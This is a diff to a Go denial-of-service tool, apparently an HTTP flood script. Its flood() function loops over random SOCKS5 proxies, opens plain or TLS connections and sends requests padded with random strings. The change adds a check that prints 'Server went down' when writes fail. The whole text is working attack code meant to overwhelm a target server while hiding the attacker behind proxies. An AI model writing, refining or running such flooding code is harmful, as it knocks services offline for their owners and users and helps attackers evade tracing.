@@ -190,13 +190,12 @@ func flood() {
 		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
 	}
 	var s net.Conn
-	var err error
 	<-start
 	for {
 		proxyAddr := proxies[rand.Intn(len(proxies))]
 		dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
 		if err != nil {
-			continue
+			continue 
 		}
 		if port == "443" {
 			cfg := &tls.Config{
@@ -223,7 +222,11 @@ func flood() {
 				request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 			}
 			request += header + "\r\n"
-			s.Write([]byte(request))
+			_, err := s.Write([]byte(request))
+			if err != nil {
+				fmt.Println("Server went down")
+				break
+			}
 		}
 		s.Close()
 	}
